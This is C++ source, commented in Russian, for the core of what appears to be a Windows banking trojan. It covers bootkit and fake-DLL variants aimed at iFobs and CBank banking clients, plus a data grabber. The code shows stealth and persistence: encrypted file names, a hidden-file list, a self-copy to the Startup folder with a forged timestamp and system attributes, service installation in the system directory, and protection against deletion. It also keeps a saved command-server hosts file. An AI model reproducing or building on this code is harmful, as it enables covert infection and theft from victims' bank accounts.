//---------------------------------------------------------------------------
#include <shlobj.h>

#include "BotCore.h"
#include "BotUtils.h"
#include "HTTPConsts.h"
#include "BotDef.h"
#include "BotHosts.h"
#include "StrConsts.h"
#include "Pipes.h"


//#include "DbgRpt.h"


//---------------------------------------------------------------------------
#include "BotDebug.h"

namespace COREDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// Объявляем шаблон вывода отладочных строк
#define COREDBG COREDEBUGSTRINGS::DBGOutMessage<>

//---------------------------------------------------------------------------


//если компилится bot.plug, то функции его удаления и объявления находятся в файле main.cpp его проекта
//для остальных проектов такое удаление не нужно
#ifdef BOTPLUG
	extern bool FakeDllDelete();
	bool UpdateBotFakeDll( BYTE* data, int c_data );
	bool UpdateBotBootkit( BYTE* data, int c_data );
#endif




struct TBotData
{
	TProcessType ProcessType;  // Тип запущенного процесса

	string  BotPath;     // Каталог бота
	string  WorkPath;
	string  BotExeName;  // Полное имя ехе бота
	//string  BotShortLinkName; // Имя файла ярлыка

    // Данные для работы сервиса
	string                ServiceName;
	SERVICE_TABLE_ENTRYA  ServiceTable[1];
	SERVICE_STATUS        ServiceStatus;
	SERVICE_STATUS_HANDLE ServiceStatusHandle;
};



//---------------------------------------------------------------------------

TBotApplication* Bot = NULL;
TBotData* BotData = NULL;


//
// Тип бота. Устанавливается вручную из всех типов проектов
//
TBotType BotType = BotRing3;


//--------------------------------------------
// Массив хэше файлов, которые будет
// прятать бот
//--------------------------------------------
DWORD BOT_HIDDEN_FILES[MAX_HIDDEN_FILES + 1] = {0};


//---------------------------------------------------------------------------

// Максимальный размер массива шифрованного файла
#define MAX_CRYPTED_EXE_NAME_SIZE 50


// Шифрованное имя исполняемого файла бота
char CryptedBotExeName[MAX_CRYPTED_EXE_NAME_SIZE] = {0};


DWORD BotExeNameHash        = 0; // Хэш имени бота
DWORD BotServiceExeNameHash = 0; // Хэш имени сервиса бота

//уид бота, инициализируется в функции BOT::Initialize(), также меняется если будет изменен префикс 
//через функцию SetBankingMode()
char BOT_UID[128];




//Внутренние методы пространства имён BOT
namespace BOT
{
	//string MakeWorkPath();   // Функция генерирует полный рабочий путь
	string MakePath(const char* SubDirectory); // Функция генерирует имя пути в рабочем каталоге
}



//-------------------------------------------
// Функция собирает путь с указанной поддиректорией
// ВАЖНО:
// Функция не поддерживает вложенные поддиректории.
// ДЛя обеспечения уникальности, имя директории шифруется
//-------------------------------------------
string BOT::MakePath(const char* SubDirectory)
{
	string Path = BOT::WorkPath();

	if (!STRA::IsEmpty(SubDirectory))
	{
		if (SubDirectory[0] == SlashChar)
			SubDirectory++;

		string Temp = SubDirectory;

		if (Temp[Temp.Length() - 1] == SlashChar)
			Temp[Temp.Length() - 1] = 0;

		PCHAR SD = UIDCrypt::CryptFileName(Temp.t_str(), false);

		Path += SD;
		Path += Slash;

		STR::Free(SD);

		if (!DirExists(Path.t_str()))
			pCreateDirectoryA(Path.t_str(), NULL);
    }
	return Path;
}

//----------------------------------------------------------------------------



//-------------------------------------------
// WorkPath - Функция возвращает полный путь
//            рабочего каталога бота
//-------------------------------------------
string BOT::WorkPath()
{
	// Путь к рабочему каталогу бота, привязан  к текущему пользователю
	if (BotData->WorkPath.IsEmpty())
		BotData->WorkPath = MakeWorkPath();
	return BotData->WorkPath;
}


//-------------------------------------------
// MakeFileName - Функция генерирует имя фала
//                Имена поддиректории и файла
//                шифруются уидом
//-------------------------------------------
string BOT::MakeFileName(const char* SubDir, const char* FileName)
{
	// Функция собирает имя файла в рабочей папке бота
	string Name = MakePath(SubDir);

	// Шифруем имя файла
	if (!STRA::IsEmpty(FileName))
	{
		PCHAR Tmp = UIDCrypt::CryptFileName(FileName, false);
		Name += Tmp;
		STR::Free(Tmp);
    }

	return Name;
}

string BOT::MakeFileName(const string &SubDir, const string &FileName)
{
	return MakeFileName(SubDir.t_str(), FileName.t_str());
}






//****************************************************************************
//                              TBotApplication
//****************************************************************************

TBotApplication::TBotApplication()
{
	// Инициализируем глобальный объект
	Bot = this;


	// Инициализируем глобальные настройки бота
	FTerminated = false;

	// Определяем PID процесса
	FPID = GetUniquePID();

	// Определяем имя процесса в котором работает бот
	TMemory Buf(MAX_PATH);
	pGetModuleFileNameA(NULL, Buf.Buf(), MAX_PATH);
	FApplicationName = Buf.AsStr();
	FApplicationName.LowerCase();

	// Получаем идентификатор бота
	FUID = GenerateBotID2();
}
//-------------------------------------------------------------


TBotApplication::~TBotApplication()
{

}
//-------------------------------------------------------------

DWORD TBotApplication::PID()
{
	// Функция возвращает идентификатор процесса в котором работает бот
	return FPID;
}
//-------------------------------------------------------------

string TBotApplication::UID()
{
	return FUID;
}
//-------------------------------------------------------------

string TBotApplication::ApplicationName()
{
	// Имя приложения в котором работает бот
	return FApplicationName;
}
//-------------------------------------------------------------

//-------------------------------------------------------------

string TBotApplication::CreateFile(const char* SubDir, const char* FileName)
{
	string Name = BOT::MakeFileName(SubDir, FileName);
	File::WriteBufferA(Name.t_str(), NULL, 0);
	return Name;
}

string TBotApplication::CreateFile(const string &SubDir, const char* FileName)
{
	return CreateFile(SubDir.t_str(), FileName);
}


//-------------------------------------------------------------


bool TBotApplication::FileExists(const char* SubDir, const char* FileName)
{
	// Функция проверяет наличие файла в рабочей папке бота
	string Name = BOT::MakeFileName(SubDir, FileName);
	return File::IsExists(Name.t_str());
}

bool TBotApplication::FileExists(const string &SubDir, const char* FileName)
{
	return FileExists(SubDir.t_str(), FileName);
}
//-------------------------------------------------------------

string TBotApplication::GrabberPath()
{
	// Путь к рабочему каталогу грабера данных
	if (FGrabberPath.IsEmpty())
		FGrabberPath = BOT::MakePath(GetStr(StrGrabberPath).t_str());
	return FGrabberPath;
}
//-------------------------------------------------------------

string TBotApplication::PrefixFileName()
{
	// Функция возвращает имя файла для хранения префикса
	if (FPerfixFileName.IsEmpty())
		FPerfixFileName = BOT::MakeFileName(NULL, GetStr(EStrPrefixFileName).t_str());

	return FPerfixFileName;
}
//----------------------------------------------------------------------------




PCHAR BOTDoGetWorkPath(bool InSysPath, PCHAR SubDir, PCHAR FileName)
{
	// Функция возвращает рабочий каталог бота

	string Path = BOT::WorkPath();

	if (Path.IsEmpty()) return NULL;

	// Добавляем подиректорию
	if (!STR::IsEmpty(SubDir))
	{
        PCHAR CryptDir = UIDCrypt::CryptFileName(SubDir, false);

		Path += CryptDir;

		STR::Free(CryptDir);

		if (!DirExists(Path.t_str()))
			pCreateDirectoryA(Path.t_str(), NULL);

    }

	PCHAR Result = STR::New(2, Path.t_str(), FileName);

	return  Result;
}

//----------------------------------------------------------------------------




//**************************************************************************
//  Внутренние методы ядра бота
//**************************************************************************
namespace BOT
{



	//--------------------------------------------------
	//  ExecuteDeleteBot - функция выполняет команду на
	//				       удаление бота
	//--------------------------------------------------
	void WINAPI ExecuteDeleteBot(LPVOID, PPipeMessage, bool &Cancel)
	{
		COREDBG("CORE", "Получена команда на удаление бота");

		string FileName;

		switch (BotData->ProcessType)
		{

			case ProcessLoader:
			{
				// Выполняем удаление из процесса лоадера
				FileName = BOT::GetBotFullExeName();

				// Снимаем защиту с бота
                Unprotect();

                break;
            }
		}

		COREDBG("CORE", "Удаляем файл %s", FileName);
		DeleteBotFile(FileName.t_str());

		Cancel = true;
    }

	//удаляет тело (файл) бота
	bool DeleteBotFile( const char* FileName, DWORD TimeOut, bool DeleteAfterReboot )
	{
		// Удаляем файл
		if (!pSetFileAttributesA(FileName, FILE_ATTRIBUTE_NORMAL ))
		{
			DWORD Err = pGetLastError();
			// Если файл не сущестует озращаем истину
			if (Err == ERROR_FILE_NOT_FOUND)
				return true;
		}

		DWORD Start = (DWORD)pGetTickCount();
		BOOL Deleted = FALSE;
		do
		{
			Deleted = (BOOL)pDeleteFileA(FileName);
			if (!Deleted && TimeOut)
			{
				// В случае если указан таймаут то приостанавливаем выполнение
				// и пытаемся ещё раз удалить
				DWORD Interval = (DWORD)pGetTickCount() - Start;
				if (Interval <= TimeOut)
					pSleep(250);
				else
					break;
			}
		}
		while (!Deleted && TimeOut);


		if (!Deleted && DeleteAfterReboot)
		{
			// Не удалось на прямую удалить файл.
			// Удаляем файл после перезагрузки
			Deleted = (BOOL)pMoveFileExA(FileName, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
		}

		return Deleted != FALSE;
	}
    //----------------------------------------------------------------------



	//--------------------------------------------------
	//  GetProcessPipeName - Функция возвращает имя
	//  служебного пайпа процесса
	//--------------------------------------------------
	string GetProcessPipeName(TProcessType Process)
	{
		string Name;

		switch (Process) {
			case ProcessLoader: Name = GetStr(EStrPipeLoader); break;
		}

        return Name;
	}
	//----------------------------------------------------------------------

	//--------------------------------------------------
	//  CreateProcessPipe - Функция создаёт служебный
	//                      канал процесса
	//--------------------------------------------------
	void CreateProcessPipe(TProcessType Process)
	{
		string Name = GetProcessPipeName(Process);
		if (Name.IsEmpty()) return;

		PProcessPipe P = PIPE::CreateProcessPipe(Name, false);
		if (P)
		{
			// Канал процесса успешно создан, добавляем обработчики команды
			if (Process == ProcessLoader || Process == ProcessService)
			{
				// Регистрируем команду удаления бота
                PIPE::RegisterMessageHandler(P, ExecuteDeleteBot, NULL, NULL, GetStr(EStrProcessCommandDeleteBot).Hash());
            }
		}

		PIPE::StartProcessPipe(P);
	}
	//----------------------------------------------------------------------


	//--------------------------------------------------
	//  ServiceControlHandler - Функция управления
	//                          сервисом
	//--------------------------------------------------
	void WINAPI ServiceControlHandler(DWORD Request)
	{
		if (Request == SERVICE_CONTROL_STOP || Request == SERVICE_CONTROL_SHUTDOWN)
		{
			COREDBG("BotService", "Получена команда остановки сервиса");
			BotData->ServiceStatus.dwWin32ExitCode = 0;
			BotData->ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
			pSetServiceStatus(BotData->ServiceStatusHandle, &BotData->ServiceStatus);
			return;
        }


		pSetServiceStatus (BotData->ServiceStatusHandle, &BotData->ServiceStatus);
	}

	//--------------------------------------------------
	//  ServiceMain - главная функция сервиса бота
	//--------------------------------------------------
#ifdef INSTALL_BOT_AS_SERVICE

	void WINAPI ServiceMain(DWORD argc, char** argv)
	{
		// Инициализируем данные сервиса
		COREDBG("BotService", "Запущена основная функци сервиса");
		BotData->ServiceStatus.dwServiceType       = BOT_SERVICE_TYPE;
		BotData->ServiceStatus.dwCurrentState      = SERVICE_START_PENDING;
		BotData->ServiceStatus.dwControlsAccepted  = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
		BotData->ServiceStatus.dwWin32ExitCode     = 0;
		BotData->ServiceStatus.dwServiceSpecificExitCode = 0;
		BotData->ServiceStatus.dwCheckPoint        = 0;
		BotData->ServiceStatus.dwWaitHint          = 0;

        // Регистрируем обработчик команд сервиса
		BotData->ServiceStatusHandle = (SERVICE_STATUS_HANDLE)pRegisterServiceCtrlHandlerA(BotData->ServiceName.t_str(), ServiceControlHandler);
		if (BotData->ServiceStatusHandle == (SERVICE_STATUS_HANDLE)0)
		{
			// Не удалось зарегистрировать обработик команд сервиса
			COREDBG("BotService", "Ошибка регистрации обработчика команд управления сервисом");
			return;
		}

		BotData->ServiceStatus.dwCurrentState = SERVICE_RUNNING;
		pSetServiceStatus (BotData->ServiceStatusHandle, &BotData->ServiceStatus);

		// Запускаем бесконечный цикл ожидания прерывания работы сервиса
		while (BotData->ServiceStatus.dwCurrentState == SERVICE_RUNNING)
		{
			pSleep(500);
		}

		BotData->ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		pSetServiceStatus (BotData->ServiceStatusHandle, &BotData->ServiceStatus);

	}
	//----------------------------------------------------------------------
#endif


	//--------------------------------------------------
	//  CheckIsService - Функция проверяет является ли
	//                   процесс сервисом
	//--------------------------------------------------
	bool CheckIsService()
	{

		DWORD Hash1 = Bot->ApplicationName().Hash(0, true);
		DWORD Hash2 = GetServiceFullExeName().Hash(0, true);
		return Hash1 == Hash2;
	}

}
//**************************************************************************









void BOT::Initialize(TProcessType ProcessType)
{
	// Функция инициализирует глобальные настройки бота

	// Инициализируем апи
	InitializeAPI();

	//Создаём глобальные объекты бота
	BotData = CreateStruct(TBotData);

	Bot     = new TBotApplication();


	// Инициализиуем глобальные данные бота
	// Перед установкой типа процесса проверем не
	// является ли процесс сервисом
	BotData->ProcessType = (CheckIsService()) ? ProcessService : ProcessType;

	// Создаём имя рабочей папки
	WorkPath();

	// Создаём имя ехе
	GetBotExeName();

	GenerateUid(BOT_UID);

	// Включаем создание дампа при исключении
	// Пытаемся встать в начало списка, что дает нам возможность перехватить
	// ошибку до возможно установленных системных VEH.
	//InitialializeGlogalExceptionLogger(TRUE);


	CreateProcessPipe(ProcessType);
}

void BOT::InitializeApi()
{
	// Инициализируем апи
	InitializeAPI();
}
//----------------------------------------------------------------------------

//----------------------------------------------------
//  Функция вернёт истину если поступила команда
//  прерваь работу бота. Задействовано для горячего
//  апдейта бота.
//
//  В данный момент функция-заглушка
//----------------------------------------------------
bool BOT::Terminated() 
{ 
	return false; 
}


//----------------------------------------------------
// GetBotPath - Имя крневого каталога бота
//              В этом каталоге будут лежать самые
//              выжные файлы бота.
//  Для некритичных, временных и других файлов
//  использовать GetWorkPath()
//----------------------------------------------------
string BOT::GetBotPath()
{
	if (BotData->BotPath.IsEmpty())
    	BotData->BotPath = MakeBotPath();
	return BotData->BotPath;
}
//----------------------------------------------------------------------------

PCHAR BOT::GetWorkPath(PCHAR SubDir, PCHAR FileName)
{
	//  Функция возвращает рабочий путь бота
    return BOTDoGetWorkPath(false, SubDir, FileName);
}
//----------------------------------------------------------------------------

//PCHAR BOT::GetWorkPathInSysDrive(PCHAR SubDir, PCHAR FileName)
//{
//	//  Аналог функции GetWorkPath.
//	//  Главное от личие от неё в том, что пусть
//	//   создаётся в корне системного диска
//    return BOTDoGetWorkPath(true, SubDir, FileName);
//}

//----------------------------------------------------------------------------

PCHAR BOT::GetBotExeName()
{
	//  Функция возвращает имя файла бота

	// При необходимости генерируем имя бота
	if (STR::IsEmpty(CryptedBotExeName))
	{
		// Для 32 разрядного бота работающего на 64 разрядной
		// винде имя файла будет статический и представять
		// для юзера что-то удобочитаемое

		#ifdef _WIN64
			bool UseStaticName = false;
		#else
			bool UseStaticName = IsWIN64();
		#endif

		string Exe = GetStr(EStrOriginalBotExeName);

		// Создаём динамическое имя
		if (!UseStaticName)
		{
			PCHAR Name = UIDCrypt::CryptFileName(Exe.t_str(), false);
			Exe = Name;
			STR::Free(Name);
        }

		DWORD Max = MAX_CRYPTED_EXE_NAME_SIZE - 5;
		if (Exe.Length() > Max)
			Exe.SetLength(Max);

		Exe += ".exe";

		STR::Copy(Exe.t_str(), CryptedBotExeName, 0, Exe.Length() + 1);

		// Расчитываем хэш имени
		BotExeNameHash = STRA::Hash(CryptedBotExeName);

		// Добавляем имя в список скрываемых фалов
		AddHiddenFile(BotExeNameHash);

		//GetBotLinkName(); // Добавляем имя ярлыка в список скрываемых файлов
	}


	return CryptedBotExeName;
}
//----------------------------------------------------------------------------

//----------------------------------------------------
//  GetBotLinkName - Функция возвращает имя файла
//     				 ярлыка бота
//----------------------------------------------------
//string BOT::GetBotLinkName()
//{
//	if (BotData->BotShortLinkName.IsEmpty())
//	{
//		PCHAR Link = UIDCrypt::CryptFileName(GetStr(EStrBotStartupLinkName).t_str(), false);
//		BotData->BotShortLinkName = Link;
//		AddHiddenFile(Link);
//		STR::Free(Link);
//    }
//	return BotData->BotShortLinkName;
//}

//----------------------------------------------------------------------------

DWORD BOT::GetBotExeNameHash()
{
	//  Функция возвращает хэш имя файла бота
    GetBotExeName();
    return BotExeNameHash;
}
//----------------------------------------------------------------------------

string BOT::GetBotFullExeName()
{
	if (BotData->BotExeName.IsEmpty())
	{
		BotData->BotExeName = GetSpecialFolderPathA(CSIDL_STARTUP, GetBotExeName());
	}
    return BotData->BotExeName;
}
//----------------------------------------------------------------------------

//----------------------------------------------------
//  GetServiceFullExeName - Функция возвращает полное
//						    имя файла сервиса бота
//----------------------------------------------------
string BOT::GetServiceFullExeName()
{
	// Создаём имя ехе файла сервиса
	string Path = GetSpecialFolderPathA(CSIDL_SYSTEM, GetStr(EStrBotServiceExePath).t_str());

	if (!DirExists(Path.t_str()))
		pCreateDirectoryA(Path.t_str(), NULL);

	Path += GetStr(EStrBotServiceExeName);

	return Path;
}
//----------------------------------------------------------------------------



HANDLE BotFileHandle = NULL;
HANDLE BotMapHandle = NULL;


void BOT::Protect(PCHAR FileName)
{
	// Функция защищает ехе бота от удаления
	string Name = FileName;

	if (Name.IsEmpty())
		Name = GetBotFullExeName();

	if (Name.IsEmpty())
    	return;

	// Открываем файл
	BotFileHandle = (HANDLE)pCreateFileA(Name.t_str(), GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );


	if (BotFileHandle != INVALID_HANDLE_VALUE)
	{
		BotMapHandle = (HANDLE)pCreateFileMappingA(Name.t_str(), NULL, PAGE_READONLY, 0, 0, NULL );
	}
}

//----------------------------------------------------------------------------

void BOT::Unprotect()
{
	// Функция снимает защиту с ехе файла бота
	pCloseHandle(BotFileHandle);
	pCloseHandle(BotMapHandle);

	BotFileHandle = NULL;
	BotMapHandle = NULL;
}
//----------------------------------------------------------------------------


bool BOT::AddToAutoRun(PCHAR FileName)
{
	// Функция добавляет файл в автозагрузку

	if (!FileExistsA(FileName))
		return false;

	string BotFile = GetBotFullExeName();

	if (StrSame(FileName, BotFile.t_str(), false, 0))
		return 0;

	COREDBG("Core", "Добавляем бот в автозагрузку. FileName = %s", BotFile.t_str());

    // Снимаем системные атрибуты
	pSetFileAttributesA(BotFile.t_str(), FILE_ATTRIBUTE_NORMAL);

	// Копируем файл
	bool Result = (BOOL)pCopyFileA(FileName, BotFile.t_str(), TRUE) == TRUE;

	// Устанавливаем дату файла
	SetFakeFileDateTime(BotFile.t_str());

	pSetFileAttributesA(BotFile.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );

	// Удаляем исходный файл
	if (Result)
		pDeleteFileA(FileName);

	return Result;
}


//----------------------------------------------------
// InstallService - Функция инсталирует ехе бота
//                  как сервис
// FileName - Имя ехе файла бота
//----------------------------------------------------
bool BOT::InstallService(const char* FileName)
{
#ifdef INSTALL_BOT_AS_SERVICE

	if (!FileExistsA((PCHAR)FileName))
		return false;

	string FN = GetServiceFullExeName();
	if (FN.IsEmpty() || File::IsExists(FN.t_str())) 
		return false;

    COREDBG("BotCore", "Устанавливаем сервис бота");
	// Копируем файл в системную директорию

	COREDBG("BotCore", "Создаём EXE бота %s", FN.t_str());
    bool Result = (BOOL)pCopyFileA(FileName, FN.t_str(), FALSE) != FALSE;
	if (Result)
	{
		pSetFileAttributesA(FN.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );

		// Файл скопирован, инсталируем сервис
		TService Service;
		Service.Name        = GetStr(EStrServiceName);
		Service.DisplayName = Service.Name;

		COREDBG("BotCore", "Создаём сервис %s", Service.Name.t_str());

		Result = Service.Install(FN.t_str());
		if (Result)
			Result = Service.Start();
		if (Result)
			COREDBG("BotCore", "Сервис успешно создан и запущен");
		else
			COREDBG("BotCore", "Ошибка создания и запуска сервиса %d", pGetLastError());

		if (!Result)
		{
			COREDBG("BotCore", "Не удалось запустить сервис. Ошибка %d", pGetLastError());
		}
	}
	return Result;

#else

	return false;

#endif
}

//----------------------------------------------------
// UpdateService - Функция обновляет ехе сервиса
//----------------------------------------------------
bool BOT::UpdateService(const char* FileName)
{
#ifdef INSTALL_BOT_AS_SERVICE
	if (!File::IsExists((PCHAR)FileName))
		return false;
		
	string FN = GetServiceFullExeName();
	if (FN.IsEmpty()) 
		return false;
		
	COREDBG("BotCore", "Обновляем ехе сервиса %s", FN.t_str());
	TService Service;
	Service.Name = GetStr(EStrServiceName);
	
	// Останавливаем сервис
	BOOL Result = Service.Stop(30000);
	COREDBG("BotCore", "Останавливаем сервис. Результат=%d [Err:%d]", Result, pGetLastError());

	// Заменяем файл
	Result = DeleteBotFile(FN.t_str(), 30000, false);
	COREDBG("BotCore", "Удаляем файл сервиса. Результат=%d [Err:%d]", Result, pGetLastError());
	
	Result = (BOOL)pCopyFileA(FileName, FN.t_str(), FALSE);
    COREDBG("BotCore", "Заменяем файл сервиса. Результат=%d [Err:%d]", Result, pGetLastError());
	
	pSetFileAttributesA(FN.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );

	// Запускаем сервис
	Service.Close();
	Result = Service.Start();
	COREDBG("BotCore", "Стартуем сервис. Результат=%d [Err:%d]", Result, pGetLastError());
	
	return Result != 0;
#else
	return false;
#endif
}


//----------------------------------------------------
// UninstallService - Функция деинсталирует
//                    сервис бота
//----------------------------------------------------

bool BOT::UninstallService()
{
	bool Result = false;

#ifdef BotServiceH

	COREDBG("BotCore", "Деинсталируем сервис");

	TService Service;
	Service.Name = GetStr(EStrServiceName);

	Result = Service.Uninstall();
	if (Result)
	{
		// Удалем файл
		string ExeName = GetServiceFullExeName();
		COREDBG("BotCore", "Сервис деинсталирован. Удаляем ехе %s", ExeName.t_str());
		Result = DeleteBotFile(ExeName.t_str(), 30000, false);

	}
	if (Result)
		COREDBG("BotCore", "Сервис успешно деинсталирован");
	else
		COREDBG("BotCore", "Ошибка деинсталяции сервиса. Ошибка %d", pGetLastError());
#endif
	return Result;
}




//----------------------------------------------------
// ExecuteService - Функция запускает выполнение
//                  сервиса
//----------------------------------------------------
#ifdef INSTALL_BOT_AS_SERVICE
	void BOT::ExecuteService()
	{
		BotData->ServiceName = GetStr(EStrServiceName);

		COREDBG("BotService", "Запущен сервис бота %s", BotData->ServiceName.t_str());

		BotData->ServiceTable[0].lpServiceName = BotData->ServiceName.t_str();
		BotData->ServiceTable[0].lpServiceProc = ServiceMain;

		pStartServiceCtrlDispatcherA(BotData->ServiceTable);
		COREDBG("BotService", "Сервис завершил работу");
		pExitProcess(0);
	}
#endif


//----------------------------------------------------
// IsService - Функция возвращает истину если
//             текущий процесс является сервисом
//----------------------------------------------------
bool BOT::IsService()
{
	return BotData->ProcessType == ProcessService;
}



//----------------------------------------------------
//  TryCreatBotInstance - функция возвращает 
//  хендл мьютекса, ненулевое значение которого означает
//  что этот экземпляр запущен первым.
//----------------------------------------------------
HANDLE BOT::TryCreateBotInstance()
{
	return TryCreateSingleInstance(GetStr(StrBotGlobalMutexName).t_str());
}

//создает мьютекс для буткита, если возвращает 0, то значит уже кто-то его создал 
HANDLE BOT::CreateBootkitMutex()
{
	return TryCreateSingleInstance(GetStr(StrBootkitIsRunMutex).t_str());
}

//возвращает true, если запущен бот из под буткита
bool BOT::BootkitIsRun()
{
	HANDLE m = BOT::CreateBootkitMutex();
	if( m == 0 ) return true;
	pCloseHandle(m);
	return false;
}

//----------------------------------------------------
//  IsRunning - Функция возвращает истину если в
//  системе уже запущен экземпляр бота
//----------------------------------------------------
bool BOT::IsRunning()
{
	HANDLE H = TryCreateBotInstance();
	bool Result = (H == 0);
	if (H) pCloseHandle(H);
	return Result;
}

//----------------------------------------------------
//  SendProcessMessage - Функция отправляет сообщение
//  служебному процессу
//----------------------------------------------------
bool BOT::SendProcessMessage(TProcessType Process, const string &Message)
{
	return PIPE::SendMessage(GetProcessPipeName(Process), Message);
}


//----------------------------------------------------
//  Delete - Функция удаляет ехе бота
//----------------------------------------------------
void BOT::Delete()
{
	bool deleted = false;
	switch( BOT::GetBotType() )
	{

		case BotFakeDll:
			{
				#ifdef BOTPLUG
					deleted = FakeDllDelete();
				#endif
				break;
			}

	}

	if( !deleted )
	{
		if (BotData->ProcessType == ProcessLoader || BotData->ProcessType == ProcessService)
		{
			bool C; // Для согласования вызова
			ExecuteDeleteBot(NULL, NULL, C);
		}
		else
		{
			//  Метод вызывается из другого процесса,
			//  Отправляем команду на удаление
			string Cmd = GetStr(EStrProcessCommandDeleteBot);

			SendProcessMessage(ProcessLoader,  Cmd);
			SendProcessMessage(ProcessService, Cmd);
		}
	}
}

void BOT::DeleteAutorunBot()
{
	DeleteBotFile(BOT::GetBotFullExeName().t_str());
}
//----------------------------------------------------------------------------


PCHAR BOT::GetHostsFileName()
{
	// Функция возвращает имя файла основного списка хостов бота
	return BOT::GetWorkPath(NULL, GetStr(EStrHostsFileName).t_str());
 }
//---------------------------------------------------------------------------



void BOT::SaveSettings(bool SavePrefix, bool SaveHosts, bool IgnoreIfExists)
{
	// Функция сохраняет базовые настройки

	// Сохраняем хосты
	if (SaveHosts)
	{
		PCHAR HostsName = GetHostsFileName();
		if (!IgnoreIfExists || !FileExistsA(HostsName))
			SaveHostsToFile(HostsName);
		STR::Free(HostsName);
    }

	// Сохраняем префикс
	if (SavePrefix)
	{
		string PrefixFile = Bot->PrefixFileName();
		if (!IgnoreIfExists || !FileExistsA(PrefixFile.t_str()))
			SavePrefixToFile(PrefixFile.t_str());
    }
}
//----------------------------------------------------------------------------

void BOT::DeleteSettings()
{
	// Функция удаляет ранее сохранённые настройки
	// Удаляем хосты
	PCHAR HostsName = BOT::GetHostsFileName();
	pDeleteFileA(HostsName);
	STR::Free(HostsName);

	// Удаляем файл префикса
	pDeleteFileA(Bot->PrefixFileName().t_str());
}

//----------------------------------------------------------------------------


//----------------------------------------------------
// Функция сохраняет префикс бота во временный файл
//----------------------------------------------------
void BOT::SavePrefixToTemporaryFile()
{
	string FileName = MakeFileName(NULL, GetStr(EStrTemporaryPrefixFileName).t_str());
	SavePrefixToFile(FileName.t_str());
}
//----------------------------------------------------------------------------

//----------------------------------------------------
// Функция загружает префикс бота из временного файла
// сохраняет его в рабочий файл и удаляет временный
//----------------------------------------------------
void BOT::SavePrefixFromTemporaryFile(bool IgnoreIfExists)
{
	string TempName   = MakeFileName(NULL, GetStr(EStrTemporaryPrefixFileName).t_str());
	if (File::IsExists(TempName.t_str()))
	{
		
		//if (!IgnoreIfExists || !File::IsExists(PrefixFile.t_str()))
		{
			DWORD Size = 0;
			LPBYTE Prefix = File::ReadToBufferA(TempName.t_str(), Size);
			if (Prefix && Size)
			{
				string PrefixFile = Bot->PrefixFileName();
				File::WriteBufferA(PrefixFile.t_str(), Prefix, Size);
			}
			MemFree(Prefix);
        }
		pDeleteFileA(TempName.t_str());
    }
}



//----------------------------------------------------
//  Функция установки/получения типа бота
//----------------------------------------------------
void BOT::SetBotType(TBotType Type)
{
    BotType = Type;
}

TBotType BOT::GetBotType()
{
	return BotType;
}

//----------------------------------------------------
//  Функции для обеспечения сокрытия служебных файлов
//----------------------------------------------------

void BOT::AddHiddenFile(DWORD Hash)
{
	// Добавляем нэш в массив скрываемых файлов
	if (!Hash) return;

	for (int i = 0; i < MAX_HIDDEN_FILES; i++)
	{
		if (BOT_HIDDEN_FILES[i] == Hash) break;
		else
		if (BOT_HIDDEN_FILES[i] == 0)
		{
			BOT_HIDDEN_FILES[i] = Hash;
			BOT_HIDDEN_FILES[i + 1] = 0;
			break;
		}
	}
}

void BOT::AddHiddenFile(const char* FileName)
{
	AddHiddenFile(STRA::Hash(FileName));
}


bool BOT::IsHiddenFile(DWORD FileHash)
{
	// Функция возвращает истину если указанный файл необходимо спрятать
	for (int i = 0; i < MAX_HIDDEN_FILES, BOT_HIDDEN_FILES[i] != 0 ; i++)
	{
		if (BOT_HIDDEN_FILES[i] == FileHash)
			return true;
	}
	return false;
}


bool BOT::IsHiddenFile(const char* FileName)
{
	return IsHiddenFile(STRA::Hash(FileName));
}

//возвращает true, если фейкдлл установлена
bool BOT::FakeDllInstalled()
{
	return Bot->FileExists( 0, GetStr(EStrFakeDllFlag).t_str() );
}

//возвращает true, если установлена фейкдлл в папке ифобс
bool BOT::FakeDllIFobsInstalled()
{
	return Bot->FileExists( 0, GetStr(EStrFakeDllIFobsFlag).t_str() );
}

//возвращает true, если установлена фейкдлл в папке cbank
bool BOT::FakeDllCBankInstalled()
{
	return Bot->FileExists( 0, GetStr(EStrFakeDllCBankFlag).t_str() );
}
